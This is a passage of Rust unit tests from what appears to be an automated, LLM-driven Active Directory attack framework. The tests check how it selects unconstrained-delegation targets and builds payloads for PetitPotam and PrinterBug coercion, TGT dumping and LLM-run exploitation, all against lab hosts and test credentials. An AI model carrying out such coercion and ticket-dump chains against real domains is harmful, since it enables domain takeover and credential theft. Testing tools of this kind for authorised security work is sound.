            id: format!("c-{user}"),
            username: user.to_string(),
            password: password.to_string(),
            domain: domain.to_string(),
            source: String::new(),
            discovered_at: None,
            is_admin: false,
            parent_id: None,
            attack_step: 0,
        }
    }

    fn make_host(hostname: &str, ip: &str) -> ares_core::models::Host {
        ares_core::models::Host {
            ip: ip.to_string(),
            hostname: hostname.to_string(),
            os: String::new(),
            roles: Vec::new(),
            services: Vec::new(),
            is_dc: false,
            owned: false,
        }
    }

    fn make_uc_vuln(
        vuln_id: &str,
        account_name: &str,
        domain: &str,
    ) -> ares_core::models::VulnerabilityInfo {
        let mut details = std::collections::HashMap::new();
        details.insert("account_name".into(), json!(account_name));
        details.insert("domain".into(), json!(domain));
        ares_core::models::VulnerabilityInfo {
            vuln_id: vuln_id.to_string(),
            vuln_type: "unconstrained_delegation".into(),
            target: "".into(),
            discovered_by: "test".into(),
            discovered_at: chrono::Utc::now(),
            details,
            recommended_agent: String::new(),
            priority: 1,
        }
    }

    // --- find_host_ip_for_machine_account ------------------------------

    #[test]
    fn find_host_ip_short_hostname_match() {
        let mut s = StateInner::new("op-test".into());
        s.hosts.push(make_host("dc01", "192.168.58.10"));
        assert_eq!(
            find_host_ip_for_machine_account(&s, "DC01$").as_deref(),
            Some("192.168.58.10")
        );
    }

    #[test]
    fn find_host_ip_fqdn_match() {
        let mut s = StateInner::new("op-test".into());
        s.hosts
            .push(make_host("dc02.child.contoso.local", "192.168.58.11"));
        assert_eq!(
            find_host_ip_for_machine_account(&s, "DC02$").as_deref(),
            Some("192.168.58.11")
        );
    }

    #[test]
    fn find_host_ip_returns_none_when_no_match() {
        let mut s = StateInner::new("op-test".into());
        s.hosts
            .push(make_host("sql01.contoso.local", "192.168.58.20"));
        assert!(find_host_ip_for_machine_account(&s, "DC01$").is_none());
    }

    #[test]
    fn find_host_ip_does_not_match_longer_hostname_prefix() {
        // "DC01$" must not greedily match "dc011".
        let mut s = StateInner::new("op-test".into());
        s.hosts
            .push(make_host("dc011.contoso.local", "192.168.58.11"));
        assert!(find_host_ip_for_machine_account(&s, "DC01$").is_none());
    }

    // --- select_unconstrained_work_items -------------------------------

    #[test]
    fn select_uc_skips_other_vuln_types() {
        let mut s = StateInner::new("op-test".into());
        let mut v = make_uc_vuln("v1", "DC02$", "contoso.local");
        v.vuln_type = "constrained_delegation".into();
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.hosts.push(make_host("dc02", "192.168.58.11"));
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        assert!(select_unconstrained_work_items(&s, &HashMap::new(), Instant::now()).is_empty());
    }

    #[test]
    fn select_uc_skips_exploited() {
        let mut s = StateInner::new("op-test".into());
        let v = make_uc_vuln("v1", "DC02$", "contoso.local");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.exploited_vulnerabilities.insert("v1".into());
        s.hosts.push(make_host("dc02", "192.168.58.11"));
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        assert!(select_unconstrained_work_items(&s, &HashMap::new(), Instant::now()).is_empty());
    }

    #[test]
    fn select_uc_skips_completed_phase() {
        let mut s = StateInner::new("op-test".into());
        let v = make_uc_vuln("v1", "DC02$", "contoso.local");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.hosts.push(make_host("dc02", "192.168.58.11"));
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let mut phases = HashMap::new();
        phases.insert(
            "v1".into(),
            PhaseState {
                coercion_dispatched_at: Some(Instant::now()),
                dump_attempts: 0,
                last_dump_at: None,
                completed: true,
            },
        );
        assert!(select_unconstrained_work_items(&s, &phases, Instant::now()).is_empty());
    }

    #[test]
    fn select_uc_machine_no_phase_picks_coerce() {
        let mut s = StateInner::new("op-test".into());
        let v = make_uc_vuln("v1", "DC02$", "contoso.local");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.hosts.push(make_host("dc02", "192.168.58.11"));
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let work = select_unconstrained_work_items(&s, &HashMap::new(), Instant::now());
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].action, Action::Coerce);
        assert_eq!(work[0].host_ip, "192.168.58.11");
        assert_eq!(work[0].dc_ip.as_deref(), Some("192.168.58.10"));
    }

    #[test]
    fn select_uc_machine_no_phase_when_already_coerced_picks_dump() {
        let mut s = StateInner::new("op-test".into());
        let v = make_uc_vuln("v1", "DC02$", "contoso.local");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.hosts.push(make_host("dc02", "192.168.58.11"));
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.mark_processed(DEDUP_COERCED_DCS, "192.168.58.10".into());
        let work = select_unconstrained_work_items(&s, &HashMap::new(), Instant::now());
        assert_eq!(work[0].action, Action::Dump);
    }

    #[test]
    fn select_uc_machine_without_dc_returns_nothing() {
        let mut s = StateInner::new("op-test".into());
        let v = make_uc_vuln("v1", "DC02$", "contoso.local");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.hosts.push(make_host("dc02", "192.168.58.11"));
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        // No domain_controllers entry → can't coerce.
        assert!(select_unconstrained_work_items(&s, &HashMap::new(), Instant::now()).is_empty());
    }

    #[test]
    fn select_uc_machine_unknown_host_falls_back_to_llm_exploit() {
        // The vuln names a machine account (ws01$) that exists in LDAP but
        // whose IP isn't in state.hosts. Must route to Action::LlmExploit
        // with a distinct `uc_machine_unknown:` dedup key so the LLM can
        // resolve the IP and run the exploit, rather than being dropped by
        // the `?` operator and leaving the delegation primitive unexploited.
        let mut s = StateInner::new("op-test".into());
        let v = make_uc_vuln("v1", "WS01$", "contoso.local");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        // No host entry for ws01 — find_host_ip_for_machine_account returns None.
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let work = select_unconstrained_work_items(&s, &HashMap::new(), Instant::now());
        assert_eq!(work.len(), 1, "machine-account vuln must NOT be dropped");
        assert_eq!(work[0].action, Action::LlmExploit);
        // Stand-in host_ip = dc_ip so downstream payload builders have
        // a non-empty target.
        assert_eq!(work[0].host_ip, "192.168.58.10");
        assert_eq!(work[0].dc_ip.as_deref(), Some("192.168.58.10"));
        assert_eq!(work[0].account_name, "WS01$");
    }

    #[test]
    fn select_uc_machine_known_host_still_uses_resolved_ip() {
        // Defensive: when the host IS in state.hosts, the resolved IP must
        // win — we don't want the fallback to clobber a real host_ip.
        let mut s = StateInner::new("op-test".into());
        let v = make_uc_vuln("v1", "WS01$", "contoso.local");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.hosts.push(make_host("ws01", "192.168.58.55"));
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let work = select_unconstrained_work_items(&s, &HashMap::new(), Instant::now());
        assert_eq!(work[0].host_ip, "192.168.58.55", "must keep resolved IP");
        assert_eq!(
            work[0].action,
            Action::Coerce,
            "resolved-host machine still gets the deterministic coerce chain"
        );
    }

    #[test]
    fn select_uc_machine_post_coerce_waits_for_delay() {
        let mut s = StateInner::new("op-test".into());
        let v = make_uc_vuln("v1", "DC02$", "contoso.local");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.hosts.push(make_host("dc02", "192.168.58.11"));
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let now = Instant::now();
        let mut phases = HashMap::new();
        phases.insert(
            "v1".into(),
            PhaseState {
                coercion_dispatched_at: Some(now - Duration::from_secs(1)),
                dump_attempts: 0,
                last_dump_at: None,
                completed: false,
            },
        );
        // Within COERCE_TO_DUMP_DELAY (15s) → no work emitted.
        assert!(select_unconstrained_work_items(&s, &phases, now).is_empty());
    }

    #[test]
    fn select_uc_machine_post_coerce_dispatches_after_delay() {
        let mut s = StateInner::new("op-test".into());
        let v = make_uc_vuln("v1", "DC02$", "contoso.local");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.hosts.push(make_host("dc02", "192.168.58.11"));
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let now = Instant::now();
        let mut phases = HashMap::new();
        phases.insert(
            "v1".into(),
            PhaseState {
                coercion_dispatched_at: Some(now - (COERCE_TO_DUMP_DELAY + Duration::from_secs(1))),
                dump_attempts: 0,
                last_dump_at: None,
                completed: false,
            },
        );
        let work = select_unconstrained_work_items(&s, &phases, now);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].action, Action::Dump);
    }

    #[test]
    fn select_uc_machine_dump_retry_within_window_skipped() {
        let mut s = StateInner::new("op-test".into());
        let v = make_uc_vuln("v1", "DC02$", "contoso.local");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.hosts.push(make_host("dc02", "192.168.58.11"));
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let now = Instant::now();
        let mut phases = HashMap::new();
        phases.insert(
            "v1".into(),
            PhaseState {
                coercion_dispatched_at: Some(now - Duration::from_secs(120)),
                dump_attempts: 1,
                last_dump_at: Some(now - Duration::from_secs(5)),
                completed: false,
            },
        );
        // last_dump_at is too recent (5s ago < 60s retry delay).
        assert!(select_unconstrained_work_items(&s, &phases, now).is_empty());
    }

    #[test]
    fn select_uc_machine_dump_retry_after_max_attempts_skipped() {
        let mut s = StateInner::new("op-test".into());
        let v = make_uc_vuln("v1", "DC02$", "contoso.local");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.hosts.push(make_host("dc02", "192.168.58.11"));
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let now = Instant::now();
        let mut phases = HashMap::new();
        phases.insert(
            "v1".into(),
            PhaseState {
                coercion_dispatched_at: Some(now - Duration::from_secs(600)),
                dump_attempts: MAX_DUMP_ATTEMPTS,
                last_dump_at: Some(now - Duration::from_secs(120)),
                completed: false,
            },
        );
        assert!(select_unconstrained_work_items(&s, &phases, now).is_empty());
    }

    #[test]
    fn select_uc_user_account_uses_dc_ip_and_llm_action() {
        let mut s = StateInner::new("op-test".into());
        let v = make_uc_vuln("v1", "alice.smith", "contoso.local");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let work = select_unconstrained_work_items(&s, &HashMap::new(), Instant::now());
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].action, Action::LlmExploit);
        assert_eq!(work[0].host_ip, "192.168.58.10");
        assert_eq!(work[0]._dedup_key.as_deref(), Some("uc_user:alice.smith"));
    }

    #[test]
    fn select_uc_skips_self_coerce_loop() {
        let mut s = StateInner::new("op-test".into());
        let v = make_uc_vuln("v1", "DC01$", "contoso.local");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.hosts.push(make_host("dc01", "192.168.58.10"));
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        // DC IP == host IP (DC01 is the unconstrained host AND the DC) → skip.
        assert!(select_unconstrained_work_items(&s, &HashMap::new(), Instant::now()).is_empty());
    }

    #[test]
    fn select_uc_skips_when_no_credential_for_domain() {
        let mut s = StateInner::new("op-test".into());
        let v = make_uc_vuln("v1", "DC02$", "contoso.local");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.hosts.push(make_host("dc02", "192.168.58.11"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        // No credential for contoso.local → skip.
        assert!(select_unconstrained_work_items(&s, &HashMap::new(), Instant::now()).is_empty());
    }

    #[test]
    fn select_uc_skips_quarantined_credential() {
        let mut s = StateInner::new("op-test".into());
        let v = make_uc_vuln("v1", "DC02$", "contoso.local");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.hosts.push(make_host("dc02", "192.168.58.11"));
        s.credentials
            .push(make_cred("alice", "Pw!", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.quarantine_principal("alice", "contoso.local");
        assert!(select_unconstrained_work_items(&s, &HashMap::new(), Instant::now()).is_empty());
    }

    // --- payload builders ---------------------------------------------

    fn coerce_work() -> UnconstrainedWork {
        UnconstrainedWork {
            vuln_id: "v1".into(),
            account_name: "DC02$".into(),
            domain: "contoso.local".into(),
            host_ip: "192.168.58.11".into(),
            dc_ip: Some("192.168.58.10".into()),
            credential: Some(make_cred("alice", "Pw!", "contoso.local")),
            action: Action::Coerce,
            _dedup_key: None,
        }
    }

    #[test]
    fn coerce_payload_fields() {
        let p = build_unconstrained_coerce_payload(&coerce_work());
        assert_eq!(p["target_ip"], "192.168.58.10");
        assert_eq!(p["listener_ip"], "192.168.58.11");
        assert_eq!(p["techniques"][0], "petitpotam");
        assert_eq!(p["techniques"][1], "printerbug");
        assert_eq!(p["credential"]["username"], "alice");
        assert_eq!(p["reason"], "unconstrained_delegation_coercion");
    }

    #[test]
    fn coerce_payload_null_when_no_dc_ip() {
        let mut w = coerce_work();
        w.dc_ip = None;
        assert!(build_unconstrained_coerce_payload(&w).is_null());
    }

    #[test]
    fn coerce_payload_null_when_no_credential() {
        let mut w = coerce_work();
        w.credential = None;
        assert!(build_unconstrained_coerce_payload(&w).is_null());
    }

    #[test]
    fn dump_payload_fields() {
        let mut w = coerce_work();
        w.action = Action::Dump;
        let p = build_unconstrained_dump_payload(&w);
        assert_eq!(p["technique"], "unconstrained_tgt_dump");
        assert_eq!(p["vuln_type"], "unconstrained_delegation");
        assert_eq!(p["vuln_id"], "v1");
        assert_eq!(p["target"], "192.168.58.11");
        assert_eq!(p["target_ip"], "192.168.58.11");
        assert_eq!(p["domain"], "contoso.local");
        assert_eq!(p["account_name"], "DC02$");
        assert_eq!(p["credential"]["username"], "alice");
    }

    #[test]
    fn dump_payload_null_when_no_credential() {
        let mut w = coerce_work();
        w.credential = None;
        assert!(build_unconstrained_dump_payload(&w).is_null());
    }

    #[test]
    fn llm_exploit_payload_fields() {
        let mut w = coerce_work();
        w.account_name = "alice.smith".into();
        w.action = Action::LlmExploit;
        let p = build_unconstrained_llm_exploit_payload(&w);
        assert_eq!(p["technique"], "unconstrained_delegation_exploit");
        assert_eq!(p["vuln_type"], "unconstrained_delegation");
        assert_eq!(p["account_name"], "alice.smith");
        assert_eq!(p["is_user_account"], true);
        assert_eq!(p["credential"]["domain"], "contoso.local");
    }

    #[test]
    fn llm_exploit_payload_null_when_no_credential() {
        let mut w = coerce_work();
        w.credential = None;
        assert!(build_unconstrained_llm_exploit_payload(&w).is_null());
    }
}
